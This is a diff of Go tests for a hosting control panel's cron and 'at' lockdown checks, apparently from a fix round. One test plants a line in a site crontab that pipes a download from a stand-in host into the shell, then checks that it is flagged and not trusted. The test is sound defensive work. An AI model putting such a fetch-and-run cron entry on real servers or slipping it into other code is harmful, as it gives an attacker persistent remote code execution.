@@ -67,26 +67,40 @@ func TestFirstStepTakesExistingCrontabsAsTheBaseline(t *testing.T) {
 	}
 }
 
-// A crontab that cannot be read leaves the baseline for the next start.
-func TestBaselineWaitsForEveryCrontab(t *testing.T) {
-	fake := &fakeSiteCrontabs{content: map[string]string{"shop_example": "0 3 * * * /bin/true\n"}, broken: map[string]bool{"blog_example": true}}
+// S4 R1 fix round: a crontab that cannot be read does not hold the baseline
+// open for the others; it is named with why. An empty crontab gets an empty
+// record, so a line planted in it later is listed, never adopted.
+func TestBaselineClosesWithoutAnUnreadableCrontab(t *testing.T) {
+	fake := &fakeSiteCrontabs{content: map[string]string{"shop_example": "0 3 * * * /bin/true\n", "news_example": ""}, broken: map[string]bool{"blog_example": true}}
 	installFakeSiteCrontabs(t, fake)
 	oldAccounts := siteCrontabAccounts
 	t.Cleanup(func() { siteCrontabAccounts = oldAccounts })
 	siteCrontabAccounts = func() ([]passwdEntry, error) {
 		return []passwdEntry{
 			{Name: "blog_example", UID: 1002, Home: "/var/www/celikpanel/subscriptions/1/sites/12"},
+			{Name: "news_example", UID: 1003, Home: "/var/www/celikpanel/subscriptions/1/sites/13"},
 			{Name: "shop_example", UID: 1001, Home: "/var/www/celikpanel/subscriptions/1/sites/11"},
 		}, nil
 	}
-	if rows := checkSiteCrontabs(); len(rows) != 0 {
-		t.Fatalf("rows %+v", rows)
+	rows := checkSiteCrontabs()
+	if len(rows) != 1 || rows[0].Account != "blog_example" || rows[0].Unreadable == "" || rows[0].DomainID != 12 {
+		t.Fatalf("rows %+v: the unreadable crontab is named with why", rows)
 	}
-	if siteCrontabBaselineTaken() {
-		t.Fatal("the baseline was taken although a crontab could not be read")
+	if !siteCrontabBaselineTaken() {
+		t.Fatal("one unreadable crontab held the baseline open for the others")
 	}
-	if _, found := readSiteCrontabRecord("shop_example"); !found {
-		t.Fatal("the readable crontab's baseline is kept")
+	if _, found := readSiteCrontabRecord("news_example"); !found {
+		t.Fatal("the empty crontab got no record")
+	}
+	// Compromised code adds a task to the empty crontab after the baseline.
+	fake.content["news_example"] = "*/5 * * * * curl -s http://example.invalid/x | sh\n"
+	rows = checkSiteCrontabs()
+	got := map[string]int{}
+	for _, row := range rows {
+		got[row.Account] = row.Outside
+	}
+	if got["news_example"] != 1 {
+		t.Fatalf("rows %+v: the planted line was adopted as CelikPanel's", rows)
 	}
 }
 
@@ -105,10 +119,9 @@ celikpanel-webmail:x:997:997::/nonexistent:/usr/sbin/nologin
 `
 
 type fakeAt struct {
-	dir     string
-	writes  []string
-	atqOut  string
-	scripts map[string]string
+	dir    string
+	writes []string
+	atqOut string
 }
 
 func (f *fakeAt) ops(installed bool) siteAtOps {
@@ -120,12 +133,6 @@ func (f *fakeAt) ops(installed bool) siteAtOps {
 			return os.WriteFile(path, data, 0o640)
 		},
 		atq: func(context.Context) (string, error) { return f.atqOut, nil },
-		atJob: func(_ context.Context, id string) (string, error) {
-			if script, ok := f.scripts[id]; ok {
-				return script, nil
-			}
-			return "", errors.New("no such job")
-		},
 	}
 }
 
@@ -157,27 +164,12 @@ func withAtFiles(t *testing.T, deny string, nss string) *fakeAt {
 	return &fakeAt{dir: dir}
 }
 
-const atJobScript = `#!/bin/sh
-# atrun uid=1001 gid=1001
-# mail shop_example_com 0
-umask 22
-PATH=/usr/bin:/bin; export PATH
-cd /var/www/celikpanel/subscriptions/3/sites/7 || {
-	 echo 'Execution directory inaccessible' >&2
-	 exit 1
-}
-${SHELL:-/bin/sh} << 'marcinDELIMITER2b1f6c3e'
-/usr/bin/php /var/www/celikpanel/subscriptions/3/sites/7/public_html/x.php
-marcinDELIMITER2b1f6c3e
-`
-
 // at closed to site accounts: whoever may use at today keeps it, the website
 // accounts (homes under the hosting root, the tools' own accounts) lose it;
 // root always may. The file has at.deny's owner and mode.
 func TestAtAllowKeepsTodaysRuleMinusWebsiteAccounts(t *testing.T) {
 	fake := withAtFiles(t, testAtDeny, "passwd: files systemd\ngroup: files systemd\n")
 	fake.atqOut = "3\tSat Nov 22 10:00:00 2026 a shop_example_com\n4\tSat Nov 22 11:00:00 2026 a alice\n"
-	fake.scripts = map[string]string{"3": atJobScript}
 	at := closeSiteAtWith(context.Background(), fake.ops(true))
 	if at.State != transport.SideDoorsAtWritten {
 		t.Fatalf("state %+v", at)
@@ -192,9 +184,8 @@ func TestAtAllowKeepsTodaysRuleMinusWebsiteAccounts(t *testing.T) {
 	if len(fake.writes) != 1 || fake.writes[0] != atAllowPath+"<-"+atDenyPath {
 		t.Fatalf("writes %v: want at.allow written with at.deny's owner and mode", fake.writes)
 	}
-	if len(at.Jobs) != 1 || at.Jobs[0].Account != "shop_example_com" || at.Jobs[0].ID != "3" || at.Jobs[0].When != "Sat Nov 22 10:00:00 2026" ||
-		at.Jobs[0].Command != "/usr/bin/php /var/www/celikpanel/subscriptions/3/sites/7/public_html/x.php" {
-		t.Fatalf("jobs %+v: want the site account's job with what, whose and when", at.Jobs)
+	if len(at.Jobs) != 1 || at.Jobs[0].Account != "shop_example_com" || at.Jobs[0].ID != "3" || at.Jobs[0].When != "Sat Nov 22 10:00:00 2026" {
+		t.Fatalf("jobs %+v: want the site account's job with its number, account and time", at.Jobs)
 	}
 
 	// The next start: CelikPanel's own file is current.
